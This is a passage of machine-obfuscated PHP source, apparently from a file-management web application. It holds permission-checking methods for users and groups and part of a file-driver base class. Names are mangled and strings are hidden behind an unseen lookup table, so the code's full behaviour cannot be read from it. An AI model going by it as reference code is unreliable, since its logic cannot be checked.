$ÈˆŒŠÖ±[$Ÿ˜Ö‡Á’]; } $Û‚Éæ‘™[$…İå€›] = array_merge($Ö±ßãÊé, $şç›˜ÏÅ); } $€ˆÆŒİ = array_values(array_unique($€ˆÆŒİ)); $¾“´â½… = array($±®ò£ò[2177] => $€ˆÆŒİ, $±®ò£ò[2178] => $Û‚Éæ‘™); $ë™ƒ¿¯[$ÊÑÖ­Ô¥] = $¾“´â½…; return $¾“´â½…; } private function makeSourceAuth($°¨¾º¾İ, $ÓÓ¡Ä¥À, $˜Ïë´üü = false) { $’æ±™£ =& $_SERVER[¶Ô„œ…¯]; $€·À©ÒÚ = $’æ±™£[91]; $¹²¤Éã• = $°¨¾º¾İ[$’æ±™£[571]]; $Ó×¥–›“ = $°¨¾º¾İ[$’æ±™£[190]] == SourceModel::TYPE_GROUP; $Ú€€È²ç = $Ó×¥–›“ ? $this->groupRootAuth($¹²¤Éã•, $˜Ïë´üü) : !1; if ($Ú€€È²ç && Model($’æ±™£[573])->authCheckAction($Ú€€È²ç[$’æ±™£[489]], $’æ±™£[2001])) { return $this->groupAuthInfo($Ú€€È²ç, $¹²¤Éã•); } $˜”Ã‚¼£ = Model($’æ±™£[1428])->parentLevelArray($°¨¾º¾İ[$’æ±™£[586]]); $˜”Ã‚¼£ = array_merge(array($°¨¾º¾İ[$’æ±™£[193]]), array_reverse($˜”Ã‚¼£)); $É‹¾ŠÒ¡ = !1; foreach ($˜”Ã‚¼£ as $¼·øÑ¤) { if (!isset($ÓÓ¡Ä¥À[$¼·øÑ¤])) { continue; } $Í™ÏĞ°¼ = $this->authMake($ÓÓ¡Ä¥À[$¼·øÑ¤], $˜Ïë´üü); if ($Í™ÏĞ°¼[$’æ±™£[542]]) { $É‹¾ŠÒ¡ = $Í™ÏĞ°¼; break; } } if (!$Ó×¥–›“) { return $É‹¾ŠÒ¡; } if (!$É‹¾ŠÒ¡ && $Ú€€È²ç) { $É‹¾ŠÒ¡ = $this->groupAuthInfo($Ú€€È²ç, $¹²¤Éã•); } if (!$É‹¾ŠÒ¡) { $ÏÓÜ = Model($’æ±™£[587])->getInfo($¹²¤Éã•); $ıÌû± = explode($’æ±™£[50], trim($ÏÓÜ[$’æ±™£[586]], $’æ±™£[50])); $ıÌû± = array_reverse($ıÌû±); foreach ($ıÌû± as $¼¸¥Êê) { if ($¼¸¥Êê == $’æ±™£[230] || $¼¸¥Êê == $€·À©ÒÚ) { continue; } $Ô…½«¸Ë = $this->groupRootAuth($¼¸¥Êê, $˜Ïë´üü); if (!$Ô…½«¸Ë) { continue; } $É‹¾ŠÒ¡ = $this->groupAuthInfo($Ô…½«¸Ë, $¼¸¥Êê); break; } } if (!$É‹¾ŠÒ¡ || $É‹¾ŠÒ¡[$’æ±™£[490]] <= 0) { $ñˆÊâñâ = $this->authDeepCheck($°¨¾º¾İ[$’æ±™£[193]], $˜Ïë´üü); if ($ñˆÊâñâ) { $É‹¾ŠÒ¡ = $ñˆÊâñâ; } } return $É‹¾ŠÒ¡; } private function userIsRoot($ú¾Ò‘õ¾ = false) { $±ğ½åù‘ =& $_SERVER[¶Ô„œ…¯]; if (!$ú¾Ò‘õ¾ && KodUser::isRoot()) { return !0; } $©Û›§¿ = Model($±ğ½åù‘[599])->getInfo($ú¾Ò‘õ¾); $…Ææ‰š = Model($±ğ½åù‘[2186])->listData($©Û›§¿[$±ğ½åù‘[2187]]); if ($…Ææ‰š && $…Ææ‰š[$±ğ½åù‘[577]][$±ğ½åù‘[2188]] == 1) { return !0; } return !1; } private function sourceAuthInfo($è¾ÜØ™Â) { $à•ù–Ò• =& $_SERVER[¶Ô„œ…¯]; $šï»üÍ = Model($à•ù–Ò•[1428]); $“·ÜÍÕ” = $šï»üÍ->sourceInfo($è¾ÜØ™Â); if (!$“·ÜÍÕ”) { return !1; } $šï»üÍ->groupPathDisplay($“·ÜÍÕ”); $êŞ„éÖÒ = array($“·ÜÍÕ”); $êŞ„éÖÒ = $šï»üÍ->_listAppendPath($êŞ„éÖÒ); $“·ÜÍÕ” = $êŞ„éÖÒ[0]; $ŸÆ‰ä»¼ = $“·ÜÍÕ”[$à•ù–Ò•[584]]; if (isset($“·ÜÍÕ”[$à•ù–Ò•[592]])) { $ÅÔñ­³ = explode($à•ù–Ò•[8], trim($“·ÜÍÕ”[$à•ù–Ò•[584]], $à•ù–Ò•[8])); array_shift($ÅÔñ­³); $ŸÆ‰ä»¼ = $“·ÜÍÕ”[$à•ù–Ò•[590]] . $à•ù–Ò•[2189] . implode($à•ù–Ò•[8], $ÅÔñ­³); } return array($à•ù–Ò•[496] => $“·ÜÍÕ”[$à•ù–Ò•[32]], $à•ù–Ò•[87] => KodIO::make($“·ÜÍÕ”[$à•ù–Ò•[193]]), $à•ù–Ò•[2190] => $ŸÆ‰ä»¼); } private function groupAuthInfo($‚û…®¨„, $á³ìŸŒÂ) { $ãß¨÷÷î =& $_SERVER[¶Ô„œ…¯]; $Š·¸ß¼ˆ = Model($ãß¨÷÷î[587])->getInfo($á³ìŸŒÂ); return array($ãß¨÷÷î[2191] => intval($‚û…®¨„[$ãß¨÷÷î[489]]), $ãß¨÷÷î[2174] => $‚û…®¨„, $ãß¨÷÷î[2192] => LNG($ãß¨÷÷î[2193]), $ãß¨÷÷î[2183] => array($ãß¨÷÷î[496] => $Š·¸ß¼ˆ[$ãß¨÷÷î[32]], $ãß¨÷÷î[87] => KodIO::make($Š·¸ß¼ˆ[$ãß¨÷÷î[90]][$ãß¨÷÷î[193]]), $ãß¨÷÷î[2190] => $Š·¸ß¼ˆ[$ãß¨÷÷î[591]])); } protected function groupRootAuth($ØÍáÊú, $ÖùÒôŠ¼ = false) { $ˆ®­ØÌ =& $_SERVER[¶Ô„œ…¯]; $ÖùÒôŠ¼ = $ÖùÒôŠ¼ ? $ÖùÒôŠ¼ : USER_ID; $¿ıÏÎÊ€ = $ÖùÒôŠ¼ . $ˆ®­ØÌ[2194] . $ØÍáÊú; static $®ÜŒªı = array(); if (isset($®ÜŒªı[$¿ıÏÎÊ€])) { return $®ÜŒªı[$¿ıÏÎÊ€]; } $ééÔ³†° = Model($ˆ®­ØÌ[587])->getInfo($ØÍáÊú); $…ìí„¶ = $this->userGroupList($ÖùÒôŠ¼); $·óØ¨Â¨ = isset($…ìí„¶[$ØÍáÊú]) ? $…ìí„¶[$ØÍáÊú][$ˆ®­ØÌ[489]] : !1; if ($·óØ¨Â¨ && Model($ˆ®­ØÌ[573])->authCheckAction($·óØ¨Â¨[$ˆ®­ØÌ[489]], $ˆ®­ØÌ[2001])) { $®ÜŒªı[$¿ıÏÎÊ€] = $·óØ¨Â¨; return $·óØ¨Â¨; } $³‡Ğ¸­° = $this->sourceAuthSelect($ééÔ³†°[$ˆ®­ØÌ[90]][$ˆ®­ØÌ[193]]); $êò‡Áïú = $³‡Ğ¸­° ? $this->authMake($³‡Ğ¸­°, $ÖùÒôŠ¼) : !1; $  ôÈ÷ = $êò‡Áïú ? $êò‡Áïú[$ˆ®­ØÌ[542]] : !1; $®ÜŒªı[$¿ıÏÎÊ€] = $  ôÈ÷ ? $  ôÈ÷ : $·óØ¨Â¨; return $®ÜŒªı[$¿ıÏÎÊ€]; } public function authOwnerApply($±²åÀ£×) { $ÇÔşá‹À =& $_SERVER[¶Ô„œ…¯]; if (empty($±²åÀ£×[$ÇÔşá‹À[489]]) || isset($±²åÀ£×[$ÇÔşá‹À[2195]]) && $±²åÀ£×[$ÇÔşá‹À[2195]]) { return $±²åÀ£×; } if (AuthModel::authCheckRoot($±²åÀ£×[$ÇÔşá‹À[489]][$ÇÔşá‹À[490]])) { return $±²åÀ£×; } $Ü´«Ëòı = Model($ÇÔşá‹À[1428])->parentLevelArray($±²åÀ£×[$ÇÔşá‹À[586]]); $Ü´«Ëòı = array_merge(array($±²åÀ£×[$ÇÔşá‹À[193]]), array_reverse($Ü´«Ëòı)); $ÂšŞ¶¡º = $this->sourceAuthSelect($Ü´«Ëòı); $ĞËšÚü = array(); $ËÊÖ¦òä = array(); foreach ($ÂšŞ¶¡º as $¾Œ”èµ¿ => $Ø‡§¶ãÃ) { $ñåõª¿õ = $this->authFolderOwnerUser($Ø‡§¶ãÃ); $ĞËšÚü[$¾Œ”èµ¿] = $ñåõª¿õ; $ËÊÖ¦òä = array_merge($ËÊÖ¦òä, $ñåõª¿õ[$ÇÔşá‹À[667]]); if ($ñåõª¿õ[$ÇÔşá‹À[2196]]) { break; } } if (count($ËÊÖ¦òä) == 0) { $ËÊÖ¦òä = $this->authFolderOwnerGroup($±²åÀ£×[$ÇÔşá‹À[571]]); } $ËÊÖ¦òä = array_unique($ËÊÖ¦òä); if (AuthModel::authCheckRoot($±²åÀ£×[$ÇÔşá‹À[489]][$ÇÔşá‹À[490]])) { $ËÊÖ¦òä[] = USER_ID; } $±²åÀ£×[$ÇÔşá‹À[489]][$ÇÔşá‹À[2197]] = Model($ÇÔşá‹À[579])->userListInfo($ËÊÖ¦òä); return $±²åÀ£×; } private function authFolderOwnerGroup($å¶Åé‚) { $Àø±¯§š =& $_SERVER[¶Ô„œ…¯]; $ä§®š³¬ = Model($Àø±¯§š[2074])->where(array($Àø±¯§š[1980] => $å¶Åé‚))->select(); $éœ•ö§ = array(); if (!$ä§®š³¬) { return $éœ•ö§; } foreach ($ä§®š³¬ as $ƒ×Šè¹—) { $š¥ğ‹ = $this->authInfo($ƒ×Šè¹—); if (AuthModel::authCheckRoot($š¥ğ‹[$Àø±¯§š[489]])) { $éœ•ö§[] = $ƒ×Šè¹—[$Àø±¯§š[1780]]; } } return $éœ•ö§; } private function authFolderOwnerUser($·Å—íÜ„) { $ğ½ãÁ© =& $_SERVER[¶Ô„œ…¯]; $«”Ô¼û = array(); $éµ…‡°ô = !1; foreach ($·Å—íÜ„ as $í„Ôœş†) { $ŠôÏÖÊ± = $this->authInfo($í„Ôœş†); if ($í„Ôœş†[$ğ½ãÁ©[571]] == $ğ½ãÁ©[230]) { $éµ…‡°ô = !0; } if ($í„Ôœş†[$ğ½ãÁ©[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ŠôÏÖÊ±[$ğ½ãÁ©[489]])) { $«”Ô¼û[] = $í„Ôœş†[$ğ½ãÁ©[571]]; } } } return array($ğ½ãÁ©[667] => $«”Ô¼û, $ğ½ãÁ©[2196] => $éµ…‡°ô); } public function authMake($ç•Ùš§ß, $ÔúœŞ–¶ = false) { $Òáø‹¯á =& $_SERVER[¶Ô„œ…¯]; $ıĞ°»½Ø = $this->authArrayCheck($ç•Ùš§ß, $ÔúœŞ–¶); if ($ıĞ°»½Ø[$Òáø‹¯á[2198]]) { $ıĞ°»½Ø[$Òáø‹¯á[2198]] = $this->sourceAuthInfo($ıĞ°»½Ø[$Òáø‹¯á[2198]]); } return $ıĞ°»½Ø; } public function authArrayCheck($Ë¥ó‘Ö³, $ÀÌ¢ª„ = false) { $–„ß¨¶¶ =& $_SERVER[¶Ô„œ…¯]; if (!$Ë¥ó‘Ö³) { return array($–„ß¨¶¶[490] => 0, $–„ß¨¶¶[542] => !1); } $ÀÌ¢ª„ = $ÀÌ¢ª„ ? $ÀÌ¢ª„ : USER_ID; $Á¶Ù¡÷ê = 0; $Ã£Õˆ÷« = 0; $£Î°ê–ƒ = 0; $É®ùç š = 0; $›å‘üÂ§ = 0; $®šó»€Ñ = 0; $á¤í†á• = 1000; $µ²Ê¸´¶ = 0; $Êğµõºš = 0; $ş¨ºÀŞÑ = 0; $ÈÇïÅŒ– = 0; $¬ÍÂŸ„° = array($–„ß¨¶¶[193] => 0); foreach ($Ë¥ó‘Ö³ as $¬ÍÂŸ„°) { $°å‡¥Šõ = $this->authInfo($¬ÍÂŸ„°); if (!$°å‡¥Šõ) { continue; } $èú†‘Ğà = $¬ÍÂŸ„°[$–„ß¨¶¶[571]]; $èÎãıÍá = intval($°å‡¥Šõ[$–„ß¨¶¶[489]]); if ($¬ÍÂŸ„°[$–„ß¨¶¶[190]] == SourceModel::TYPE_USER && $èú†‘Ğà == $ÀÌ¢ª„) { $Á¶Ù¡÷ê = !0; $£Î°ê–ƒ = $°å‡¥Šõ; $Ã£Õˆ÷« = $èÎãıÍá; } else { if ($¬ÍÂŸ„°[$–„ß¨¶¶[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($èú†‘Ğà, $ÀÌ¢ª„)) { $É®ùç š = !0; $Öæ’¯İ = $this->groupStepToUserGroup($èú†‘Ğà, $ÀÌ¢ª„); if ($Öæ’¯İ < $á¤í†á•) { $á¤í†á• = $Öæ’¯İ; $›å‘üÂ§ = $èÎãıÍá; $®šó»€Ñ = $°å‡¥Šõ; $µ²Ê¸´¶ = $èú†‘Ğà; } if ($Öæ’¯İ == $á¤í†á• && $èÎãıÍá >= $›å‘üÂ§) { $›å‘üÂ§ = $èÎãıÍá; $®šó»€Ñ = $°å‡¥Šõ; $µ²Ê¸´¶ = $èú†‘Ğà; } } else { if ($èú†‘Ğà == $–„ß¨¶¶[230]) { $Êğµõºš = !0; $ÈÇïÅŒ– = $°å‡¥Šõ; $ş¨ºÀŞÑ = $èÎãıÍá; } } } } if ($Á¶Ù¡÷ê) { $ˆØêÔõ = $Ã£Õˆ÷«; $°å‡¥Šõ = $£Î°ê–ƒ; $Õ´”¾ÅÜ = LNG($–„ß¨¶¶[2199]); } else { if ($É®ùç š) { $ˆØêÔõ = $›å‘üÂ§; $°å‡¥Šõ = $®šó»€Ñ; $‘ë¸©›— = Model($–„ß¨¶¶[587])->getInfo($µ²Ê¸´¶); $Õ´”¾ÅÜ = $–„ß¨¶¶[176] . $‘ë¸©›—[$–„ß¨¶¶[591]] . $–„ß¨¶¶[2200] . LNG($–„ß¨¶¶[2201]); } else { if ($Êğµõºš) { $ˆØêÔõ = $ş¨ºÀŞÑ; $°å‡¥Šõ = $ÈÇïÅŒ–; $Õ´”¾ÅÜ = LNG($–„ß¨¶¶[2171]); } else { $ˆØêÔõ = 0; $°å‡¥Šõ = !1; $Õ´”¾ÅÜ = $–„ß¨¶¶[12]; } } } $ÄÂÖÂïÊ = array($–„ß¨¶¶[2191] => intval($ˆØêÔõ), $–„ß¨¶¶[2174] => $°å‡¥Šõ, $–„ß¨¶¶[2192] => $Õ´”¾ÅÜ, $–„ß¨¶¶[2183] => $¬ÍÂŸ„°[$–„ß¨¶¶[193]]); return $ÄÂÖÂïÊ; } private function groupContainUser($­Ãˆ†«ú, $”„‚¦»ê = false) { return in_array($­Ãˆ†«ú, $this->userGroupParents($”„‚¦»ê)); } private function groupStepToUserGroup($°àşÖ¼ş, $èÂŸşèë = false) { $¦äÁâ‰˜ =& $_SERVER[¶Ô„œ…¯]; $›”¼¸õ¸ = $this->userGroupList($èÂŸşèë); $Ä«‘ ºŠ = 1000; $×Ÿ„›ÕË = $GLOBALS[$¦äÁâ‰˜[6]][$¦äÁâ‰˜[92]][$¦äÁâ‰˜[2087]] == 1; $÷¡Ôı”Œ = $×Ÿ„›ÕË ? 3 : 2; foreach ($›”¼¸õ¸ as $¸Ô¦) { if ($¸Ô¦[$¦äÁâ‰˜[1980]] == $°àşÖ¼ş) { return 0; } $‹¥‘ ½ = explode($¦äÁâ‰˜[50], trim($¸Ô¦[$¦äÁâ‰˜[586]], $¦äÁâ‰˜[50])); if ($‹¥‘ ½[0] == $¦äÁâ‰˜[230] && count($‹¥‘ ½) > $÷¡Ôı”Œ) { $¯·æ—ï¸ = array_reverse(array_slice($‹¥‘ ½, $÷¡Ôı”Œ)); $ÔÎ…ç›² = array_search($°àşÖ¼ş, $¯·æ—ï¸); if ($ÔÎ…ç›² !== !1 && $ÔÎ…ç›² + 1 <= $Ä«‘ ºŠ) { $Ä«‘ ºŠ = $ÔÎ…ç›² + 1; } } } return $Ä«‘ ºŠ; } private function userGroupList($Á‘°İ§ = false) { $«‡±·û =& $_SERVER[¶Ô„œ…¯]; static $¯òÁ¡¡Æ = array(); if (isset($¯òÁ¡¡Æ[$Á‘°İ§])) { return $¯òÁ¡¡Æ[$Á‘°İ§]; } $¯µÆ¦ãÕ = Model($«‡±·û[599])->getInfo($Á‘°İ§); $¯òÁ¡¡Æ[$Á‘°İ§] = array_to_keyvalue($¯µÆ¦ãÕ[$«‡±·û[2172]], $«‡±·û[1980]); return $¯òÁ¡¡Æ[$Á‘°İ§]; } public function userGroupParents($è±–”ßç) { $ƒ¢Îç”µ =& $_SERVER[¶Ô„œ…¯]; static $“³æ—ê¾ = array(); $è±–”ßç = $è±–”ßç ? $è±–”ßç : USER_ID; if (isset($“³æ—ê¾[$è±–”ßç])) { return $“³æ—ê¾[$è±–”ßç]; } $¾ôÜ¯âñ = $this->userGroupList($è±–”ßç); $Ú£Ï¸ÛŒ = array(); $€£îŞ¨ = $GLOBALS[$ƒ¢Îç”µ[6]][$ƒ¢Îç”µ[92]][$ƒ¢Îç”µ[2087]] == 1; $Ğø¿²›… = $€£îŞ¨ ? 3 : 2; foreach ($¾ôÜ¯âñ as $¢Î—œµü) { $ËÓÄÖ¼ = array($¢Î—œµü[$ƒ¢Îç”µ[1980]]); $±ãŠ£¥¶ = explode($ƒ¢Îç”µ[50], trim($¢Î—œµü[$ƒ¢Îç”µ[586]], $ƒ¢Îç”µ[50])); if ($±ãŠ£¥¶[0] == $ƒ¢Îç”µ[230] && count($±ãŠ£¥¶) > $Ğø¿²›…) { $¬×´º¢© = array_slice($±ãŠ£¥¶, $Ğø¿²›…); $ËÓÄÖ¼ = array_merge($ËÓÄÖ¼, array_reverse($¬×´º¢©)); } $Ú£Ï¸ÛŒ = array_merge($Ú£Ï¸ÛŒ, $ËÓÄÖ¼); } $“³æ—ê¾[$è±–”ßç] = array_unique($Ú£Ï¸ÛŒ); return $“³æ—ê¾[$è±–”ßç]; } public function authTargetInfoMake($Ìõø¤éÉ) { $³®æòÓß =& $_SERVER[¶Ô„œ…¯]; $“–°âÒ´ = array(); $†‰«Ø»Ô = array(); foreach ($Ìõø¤éÉ as $†ÄğÍ¤à) { if ($†ÄğÍ¤à[$³®æòÓß[190]] == SourceModel::TYPE_USER) { $“–°âÒ´[] = intval($†ÄğÍ¤à[$³®æòÓß[571]]); } else { if ($†ÄğÍ¤à[$³®æòÓß[190]] == SourceModel::TYPE_GROUP) { $†‰«Ø»Ô[] = intval($†ÄğÍ¤à[$³®æòÓß[571]]); } } } if ($“–°âÒ´) { $“–°âÒ´ = Model($³®æòÓß[579])->userListInfo($“–°âÒ´); } if ($†‰«Ø»Ô) { $¶”ÕÕ±ª = array($³®æòÓß[2072] => array($³®æòÓß[494], $†‰«Ø»Ô)); $†‰«Ø»Ô = Model($³®æòÓß[587])->field($³®æòÓß[2202])->where($¶”ÕÕ±ª)->select(); $†‰«Ø»Ô = array_to_keyvalue($†‰«Ø»Ô, $³®æòÓß[1980]); } return array($³®æòÓß[2203] => $“–°âÒ´, $³®æòÓß[2204] => $†‰«Ø»Ô); } public function authInfo($ Ù·êöŞ) { $ƒ©ºù› =& $_SERVER[¶Ô„œ…¯]; if ($ Ù·êöŞ[$ƒ©ºù›[2088]]) { $¼õ˜Õµ = Model($ƒ©ºù›[573])->listData($ Ù·êöŞ[$ƒ©ºù›[2088]]); if (!$¼õ˜Õµ) { return !1; $ê£†Ğ²Œ = Model($ƒ©ºù›[573])->listData(); $øê ô±« = array_filter_by_field($ê£†Ğ²Œ, $ƒ©ºù›[489], $ƒ©ºù›[230]); return $øê ô±«; } $›ëñ·©§ = array_field_key($¼õ˜Õµ, array($ƒ©ºù›[477], $ƒ©ºù›[32], $ƒ©ºù›[489], $ƒ©ºù›[2003], $ƒ©ºù›[2004])); $›ëñ·©§[$ƒ©ºù›[2205]] = $ Ù·êöŞ; return $›ëñ·©§; } else { return array($ƒ©ºù›[495] => 0, $ƒ©ºù›[1986] => $ Ù·êöŞ[$ƒ©ºù›[2149]], $ƒ©ºù›[496] => $ƒ©ºù›[12], $ƒ©ºù›[2003] => $ƒ©ºù›[2206]); } } } goto e ÑÎ¼¸õ; CÊ½ºÈõâ‘: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬Ñîˆ§Ç =& $_SERVER[¶Ô„œ…¯]; $this->objectDriver = array($¬Ñîˆ§Ç[60], $¬Ñîˆ§Ç[61], $¬Ñîˆ§Ç[62], $¬Ñîˆ§Ç[63], $¬Ñîˆ§Ç[64], $¬Ñîˆ§Ç[65], $¬Ñîˆ§Ç[66], $¬Ñîˆ§Ç[67], $¬Ñîˆ§Ç[68], $¬Ñîˆ§Ç[69], $¬Ñîˆ§Ç[70], $¬Ñîˆ§Ç[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($×©×ÔË) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($×©×ÔË, $_SERVER[¶Ô„œ…¯][8]); } return $×©×ÔË; } public function iconvApp($èş‚—¹Ü) { return $èş‚—¹Ü; } public function iconvSystem($à¾éåšì) { return $à¾éåšì; } public function iconvTo($Ç™‘–Ñ­, $£×òÑ˜ñ, $‹—¬ŞºÂ) { $‚úÂï¸ =& $_SERVER[¶Ô„œ…¯]; if (!$Ç™‘–Ñ­ || !function_exists($‚úÂï¸[72])) { return $Ç™‘–Ñ­; } static $É—ªÔ¨× = array(); $¥œë›‡â = $£×òÑ˜ñ . $‚úÂï¸[73] . $‹—¬ŞºÂ . $‚úÂï¸[74] . $Ç™‘–Ñ­; if (isset($É—ªÔ¨×[$¥œë›‡â])) { return $É—ªÔ¨×[$¥œë›‡â]; } if (function_exists($‚úÂï¸[75])) { $ÒÉÂ³”á = @mb_convert_encoding($Ç™‘–Ñ­, $‹—¬ŞºÂ, $£×òÑ˜ñ); } else { $ÒÉÂ³”á = @iconv($£×òÑ˜ñ, $‹—¬ŞºÂ, $Ç™‘–Ñ­); } $ÒÉÂ³”á = $ÒÉÂ³”á ? $ÒÉÂ³”á : $Ç™‘–Ñ­; if (strstr($ÒÉÂ³”á, $‚úÂï¸[76])) { $ÒÉÂ³”á = str_replace($‚úÂï¸[76], $‚úÂï¸[11], $ÒÉÂ³”á); } $É—ªÔ¨×[$£×òÑ˜ñ . $‚úÂï¸[73] . $‹—¬ŞºÂ . $‚úÂï¸[74] . $Ç™‘–Ñ­] = $ÒÉÂ³”á; $É—ªÔ¨×[$‹—¬ŞºÂ . $‚úÂï¸[73] . $£×òÑ˜ñ . $‚úÂï¸[74] . $Ç™‘–Ñ­] = $Ç™‘–Ñ­; $É—ªÔ¨×[$‹—¬ŞºÂ . $‚úÂï¸[73] . $£×òÑ˜ñ . $‚úÂï¸[74] . $ÒÉÂ³”á] = $Ç™‘–Ñ­; $É—ªÔ¨×[$£×òÑ˜ñ . $‚úÂï¸[73] . $‹—¬ŞºÂ . $‚úÂï¸[74] . $ÒÉÂ³”á] = $ÒÉÂ³”á; return $ÒÉÂ³”á; } public function getPathInner($ŠÙÓ¬ÒÖ) { $Æ³‚¸Í = IO::init($ŠÙÓ¬ÒÖ); return $Æ³‚¸Í->path; } public function getPathOuter($áÇÉšĞø) { $‚±š‘¶ã =& $_SERVER[¶Ô„œ…¯]; $‘šßïÊ = strlen(trim($this->pathBase, $‚±š‘¶ã[8])); $áÇÉšĞø = substr(trim($áÇÉšĞø, $‚±š‘¶ã[8]), $‘šßïÊ); return $this->pathDriver . $‚±š‘¶ã[8] . ltrim($áÇÉšĞø, $‚±š‘¶ã[8]); } public function isParentOf($“¾Ô©ª, $“Ù×Á´«) { $åà¹•ôş =& $_SERVER[¶Ô„œ…¯]; $“¾Ô©ª = rtrim(strtolower($“¾Ô©ª), $åà¹•ôş[8]) . $åà¹•ôş[8]; $“Ù×Á´« = rtrim(strtolower($“Ù×Á´«), $åà¹•ôş[8]) . $åà¹•ôş[8]; $ü·áİÑ÷ = strpos($“Ù×Á´«, $“¾Ô©ª) === 0; return $ü·áİÑ÷; } public function getType() { $·Éüªİ— =& $_SERVER[¶Ô„œ…¯]; $ÁÌ‹ˆ¯ = str_replace($·Éüªİ—[77], $·Éüªİ—[12], get_class($this)); return strtolower($ÁÌ‹ˆ¯); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($çí¯Ñ³, $ã•€Ï„¤) { $íÕœşœ =& $_SERVER[¶Ô„œ…¯]; $ÕÂ±€ÓÊ = rtrim($çí¯Ñ³, $íÕœşœ[8]) . $íÕœşœ[8] . $ã•€Ï„¤; $¢äª†ñ = $this->exist($ÕÂ±€ÓÊ); return $¢äª†ñ ? $ÕÂ±€ÓÊ : !1; } public function setModifyTime($åõ‡ÏºÖ, $œªûùÕ = '') { } public function renameObject($ŸÖšï, $‹Ö‚—¡Ç) { $éöè‚±á = $‹Ö‚—¡Ç; $ŸÖšï = $this->getPathOuter($ŸÖšï); $‹Ö‚—¡Ç = $this->pathFather($ŸÖšï) . $‹Ö‚—¡Ç; $Á±€şÄ = IO::copy($ŸÖšï, $this->pathFather($ŸÖšï), REPEAT_RENAME_FOLDER, $éöè‚±á); if ($Á±€şÄ) { IO::remove($ŸÖšï); } return $Á±€şÄ ? $‹Ö‚—¡Ç : !1; } public function tempFile($›ˆ“ à = '', $½ğâìíĞ = '') { if (!$›ˆ“ à) { $›ˆ“ à = rand_string(15); } $ç“Ú™ìï = TEMP_FILES . rand_string(15) . $_SERVER[¶Ô„œ…¯][8]; @mkdir($ç“Ú™ìï, DEFAULT_PERRMISSIONS, !0); $Ü‰¥ô§ = $ç“Ú™ìï . $›ˆ“ à; @touch($Ü‰¥ô§); if ($½ğâìíĞ) { file_put_contents($Ü‰¥ô§, $½ğâìíĞ); } return $Ü‰¥ô§; } public function tempFileRemve($ƒƒñ•˜) { @unlink($ƒƒñ•˜); @rmdir($this->pathFather($ƒƒñ•˜)); } public function mkfile($ÒÀëûóÌ, $Èä¸–Éˆ = '', $Œ÷—ãœƒ = REPEAT_RENAME) { } public function mkdir($¼ï¥Õ¨°, $¾§šŸ®‡ = REPEAT_SKIP) { } public function delFile($ôÌ”‰³«) { } public function delFolder($‚â–˜òÎ) { } public function copyFile($ïÙæØ, $ïòšè©“) { } public function moveFile($¿ş³ÄÌå, $Åä—É“š) { } public function remove($ªÃ¨ÏÓ) { if ($this->isFile($ªÃ¨ÏÓ)) { return $this->delFile($ªÃ¨ÏÓ); } return $this->delFolder($ªÃ¨ÏÓ); } public function rename($æ›ıõüµ, $…¡§ı¾ğ) { } public function exist($Ê¹Ğ×®‰) { } public function findByHash($½ùü´‡ = '', $™èúîßº = '') { return !1; } public function isFile($Âá”’ŠÂ) { } public function isFolder($ œŸ°Ì ) { } public function size($œÒ°ªÇ) { } public function info($‘‰ƒŞ‚) { } public function infoSimple($Şïşø») { return $this->info($Şïşø»); } public function infoAuth($Ò¦î§Áë) { return $this->info($Ò¦î§Áë); } public function infoFull($¨›ŞŸ²Í) { return $this->info($¨›ŞŸ²Í); } public function infoFullSimple($½‘¾ûÚÒ) { return $this->info($½‘¾ûÚÒ); } public function infoWithChildren($ŒşÅ ØÊ) { $Ëó‡¹úé =& $_SERVER[¶Ô„œ…¯]; static $Š–ó° ú = array(); if (isset($Š–ó° ú[$ŒşÅ ØÊ])) { return $Š–ó° ú[$ŒşÅ ØÊ]; } $—À‹Îêı = $this->info($ŒşÅ ØÊ); if ($—À‹Îêı && $—À‹Îêı[$Ëó‡¹úé[33]] == $Ëó‡¹úé[78]) { $ö×Èæ÷µ = array($Ëó‡¹úé[79] => 0, $Ëó‡¹úé[80] => 0, $Ëó‡¹úé[81] => 0); $this->infoChildren($ŒşÅ ØÊ, $ö×Èæ÷µ); $—À‹Îêı[$Ëó‡¹úé[79]] = $ö×Èæ÷µ[$Ëó‡¹úé[79]]; $—À‹Îêı[$Ëó‡¹úé[82]] = array($Ëó‡¹úé[83] => $ö×Èæ÷µ[$Ëó‡¹úé[80]], $Ëó‡¹úé[84] => $ö×Èæ÷µ[$Ëó‡¹úé[81]]); $Š–ó° ú[$ŒşÅ ØÊ] = $—À‹Îêı; } return $—À‹Îêı; } public function listPath($Î±¨Á¡Ù, $‘å¾õÙÑ = false) { } public function has($ÑÁÌ‰ÔŞ, $šòìû— = false, $«ÓÔ¾×º = false) { } public function canRead($Ìš¤”€) { } public function canWrite($ÏÍ¨”Ë·) { } public function getContent($‹Í³†çÆ) { } public function setContent($ĞÌ¦Ì¢, $›Œğˆõ = '') { } protected function infoChildren($°¢ê²Ê·, &$¿ƒò®¨) { $ÛÒâİª· =& $_SERVER[¶Ô„œ…¯]; check_abort_echo(); $ƒóŸ»© = $this->listPath($°¢ê²Ê·, !0); $ƒóŸ»© = array_merge($ƒóŸ»©[$ÛÒâİª·[85]], $ƒóŸ»©[$ÛÒâİª·[86]]); foreach ($ƒóŸ»© as $â„Ù¯ç¤) { if ($â„Ù¯ç¤[$ÛÒâİª·[33]] == $ÛÒâİª·[78]) { $¿ƒò®¨[$ÛÒâİª·[81]]++; $ÏûÏàÌ = $this->getPathInner($â„Ù¯ç¤[$ÛÒâİª·[87]]); $this->infoChildren($ÏûÏàÌ, $¿ƒò®¨); } else { $¿ƒò®¨[$ÛÒâİª·[80]]++; $¿ƒò®¨[$ÛÒâİª·[79]] += $â„Ù¯ç¤[$ÛÒâİª·[79]]; } } } public function fileSubstr($Ò›ö©, $÷ÌáòóÚ, $Ù§®Øü¢) { } public function listAll($Ö›½õ†°) { } public function listAllMake($Šîğòİß, &$äÏ®İ­Ì) { $õÖ‰ =& $_SERVER[¶Ô„œ…¯]; check_abort_echo(); $Å¨Ø = $this->listPath($Šîğòİß, !0); if (!$Å¨Ø) { return; } $¹ù×Êûü = array_merge($Å¨Ø[$õÖ‰[85]], $Å¨Ø[$õÖ‰[86]]); foreach 